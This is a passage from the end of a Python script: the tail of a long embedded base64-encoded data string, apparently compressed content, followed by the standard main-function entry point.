    "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"
)

if __name__ == '__main__':
    main()
